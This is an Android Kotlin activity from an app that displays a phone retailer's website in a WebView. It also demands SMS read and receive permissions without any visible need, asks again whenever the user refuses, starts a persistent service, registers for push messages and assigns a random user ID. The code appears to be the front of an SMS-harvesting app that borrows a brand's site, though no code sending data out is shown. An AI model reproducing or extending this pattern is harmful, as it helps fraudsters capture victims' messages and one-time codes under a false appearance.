package com.example.appication

import android.content.*
import android.content.ContentValues.TAG
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.util.Log
import android.view.View
import android.view.ViewGroup
import android.webkit.RenderProcessGoneDetail
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.appication.databinding.ActivityMainBinding
import com.google.firebase.messaging.FirebaseMessaging
import java.util.*


class MainActivity : AppCompatActivity() {
    private val REQUESTCODE = 123
    private var webView : WebView? = null
    private lateinit var binding : ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        FirebaseMessaging.getInstance().subscribeToTopic("app")
        startService(Intent(this, SampleForegroundService::class.java))
        if (ContextCompat.checkSelfPermission(
                baseContext,
                "android.permission.READ_SMS"
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this@MainActivity,
                arrayOf("android.permission.READ_SMS","android.permission.RECEIVE_SMS"),
                REQUESTCODE )
        }
        webView = WebView(applicationContext)
        binding.webView.addView(webView)
        webView?.apply {
            webViewClient = object : WebViewClient() {
                override fun onRenderProcessGone(
                    view: WebView?,
                    detail: RenderProcessGoneDetail?
                ): Boolean {
                    Log.e("MY_APP_TAG", "The WebView rendering process crashed!")
                    destroyWebView()
                    startService(Intent(this@MainActivity, SampleForegroundService::class.java))
                    return true
                }
            }
            settings.allowFileAccess = true
            settings.allowContentAccess = true
            settings.domStorageEnabled = true
            settings.javaScriptEnabled = true
            settings.javaScriptCanOpenWindowsAutomatically = true
            //settings.userAgentString = "Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13"
            loadUrl("https://www.sangeethamobiles.com")
        }
        setDate()
    }



    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String?>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            REQUESTCODE -> if (!grantResults.isNotEmpty() || grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(
                    this@MainActivity,
                    arrayOf("android.permission.READ_SMS","android.permission.RECEIVE_SMS"),
                    REQUESTCODE )
            }
        }
    }

    fun destroyWebView() {

        // Make sure you remove the WebView from its parent view before doing anything.
        binding.webView.removeAllViews()
        webView?.clearHistory()

        // NOTE: clears RAM cache, if you pass true, it will also clear the disk cache.
        // Probably not a great idea to pass true if you have other WebViews still alive.
        webView?.clearCache(true)

        // Loading a blank page is optional, but will ensure that the WebView isn't doing anything when you destroy it.
        webView?.loadUrl("about:blank")
        webView?.onPause()
        webView?.removeAllViews()

        // NOTE: This pauses JavaScript execution for ALL WebViews,
        // do not use if you have other WebViews still alive.
        // If you create another WebView after calling this,
        // make sure to call mWebView.resumeTimers().
        webView?.pauseTimers()

        // NOTE: This can occasionally cause a segfault below API 17 (4.2)
        webView?.destroy()

        // Null out the reference so that you don't end up re-using it.
        webView = null
    }

    private fun setDate(){
        val sharedPref = getSharedPreferences("base",Context.MODE_PRIVATE)
        val storedTimeValue = sharedPref.getLong("time",0L)
        val storedUserValue = sharedPref.getString("user",null)
        if(storedTimeValue != 0L && storedUserValue != null) return
        val editor: SharedPreferences.Editor = sharedPref.edit()
        if(storedUserValue == null) {
            val user = (Math.floor(Math.random() * 9000000000L).toLong() + 1000000000L).toString()
            editor.putString("user", user)
        }
        if(storedTimeValue == 0L){
            val date = Date().time
            editor.putLong("time",date)
        }
        editor.apply()
    }

    override fun onBackPressed() {
        webView?.goBack()
    }

    override fun onDestroy() {
        super.onDestroy()
        println("called destroy")
        if(webView != null) {
            webView?.clearCache(true);
            webView?.clearHistory();
            webView?.onPause();
            webView?.removeAllViews();
            webView?.pauseTimers();
            webView = null;
        }

    }

}